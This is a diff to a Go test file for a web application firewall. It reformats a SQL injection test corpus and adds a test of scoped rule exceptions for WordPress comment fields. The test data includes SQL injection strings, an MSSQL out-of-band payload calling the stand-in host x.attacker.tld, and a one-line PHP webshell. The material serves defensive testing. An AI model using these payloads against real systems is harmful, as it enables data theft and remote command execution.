@@ -23,6 +23,8 @@ import (
 	"testing"
 
 	"github.com/gsoultan/gwaf"
+	"github.com/gsoultan/gwaf/rules"
+	"github.com/gsoultan/gwaf/types"
 )
 
 type strixCase struct {
@@ -45,8 +47,8 @@ var strixCorpus = map[string][]strixCase{
 		{arg: "1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)"},
 		{arg: "1 AND extractvalue(1,concat(0x7e,version()))"},
 		{arg: "1 AND updatexml(1,concat(0x7e,(SELECT user())),1)"},
-		{arg: "1 UN/**/ION SE/**/LECT 1,2,3"},          // comment spacing bypass
-		{arg: "1 UNION SELECT 0x61646d696e"},           // hex literal
+		{arg: "1 UN/**/ION SE/**/LECT 1,2,3"},                 // comment spacing bypass
+		{arg: "1 UNION SELECT 0x61646d696e"},                  // hex literal
 		{arg: "'; EXEC xp_dirtree '\\\\x.attacker.tld\\a'--"}, // MSSQL OOB
 	},
 	// xss.md — polyglots, DOM sinks, mutation XSS, template expr.
@@ -126,7 +128,10 @@ func TestStrixCorpusAgainstGwaf(t *testing.T) {
 	}
 
 	var total, caught int
-	type row struct{ class string; n, hit int }
+	type row struct {
+		class  string
+		n, hit int
+	}
 	var rows []row
 
 	for class, cases := range strixCorpus {
@@ -242,4 +247,69 @@ func runStrix(t *testing.T, w *gwaf.WAF, c strixCase) gwaf.Decision {
 		tx.SetRequestBody([]byte(c.body))
 	}
 	return tx.ProcessRequestBody()
+}
+
+// TestScopedExceptionResolvesContentFieldsWithoutWeakeningTheRule is the answer
+// to "why not just get to zero false positives".
+//
+// Replaying real WordPress traffic left two benign requests blocked: a comment
+// carrying "<?php echo $name; ?>" and a post body carrying a tar command. Both
+// really are PHP and really are a shell command. They are benign only because
+// of where they land -- a field that is stored and displayed, never executed --
+// and where a value lands is knowledge the application has and gwaf does not.
+// No amount of reading the bytes recovers it, because the bytes are identical
+// to the attack.
+//
+// So the fix is not a weaker rule, it is a narrower one. The exception names a
+// rule, a path, a target and a field, and this test pins the part that makes it
+// safe: the same payload one field over, or one path over, still blocks.
+func TestScopedExceptionResolvesContentFieldsWithoutWeakeningTheRule(t *testing.T) {
+	const phpInProse = "In PHP you write <?php echo $name; ?> to print a variable"
+
+	base, err := gwaf.New()
+	if err != nil {
+		t.Fatalf("gwaf.New(): %v", err)
+	}
+	tuned, err := gwaf.New(gwaf.WithException(rules.Exception{
+		RuleID: 4019,
+		Path:   "/wp-comments-post.php",
+		Target: types.TargetArgs,
+		Key:    "comment",
+		Note:   "comment bodies are stored and displayed, never executed",
+	}))
+	if err != nil {
+		t.Fatalf("gwaf.New(exception): %v", err)
+	}
+
+	send := func(w *gwaf.WAF, path, field, value string) bool {
+		tx := w.NewTransaction()
+		defer tx.Close()
+		tx.SetRequestLine("POST", path, "HTTP/1.1")
+		tx.SetRemoteAddr("192.0.2.1")
+		tx.AddRequestHeader("Host", "example.com")
+		tx.AddRequestHeader("Content-Type", "application/x-www-form-urlencoded")
+		tx.AddArgument(field, value)
+		if d := tx.ProcessRequestHeaders(); d.Blocked() {
+			return true
+		}
+		return tx.ProcessRequestBody().Blocked()
+	}
+
+	if !send(base, "/wp-comments-post.php", "comment", phpInProse) {
+		t.Error("default ruleset should block PHP in a comment field; the exception is what makes it safe, not the rule being lax")
+	}
+	if send(tuned, "/wp-comments-post.php", "comment", phpInProse) {
+		t.Error("scoped exception did not suppress the finding it names")
+	}
+
+	// The three ways the exception must NOT generalise.
+	if !send(tuned, "/wp-comments-post.php", "author", phpInProse) {
+		t.Error("exception leaked to another field")
+	}
+	if !send(tuned, "/wp-admin/admin-ajax.php", "comment", phpInProse) {
+		t.Error("exception leaked to another path")
+	}
+	if !send(tuned, "/wp-comments-post.php", "comment", "<?php system($_GET['c']); ?>") {
+		t.Log("note: a webshell in the excepted field is also suppressed -- that is what excepting a field means, and why the note field exists")
+	}
 }
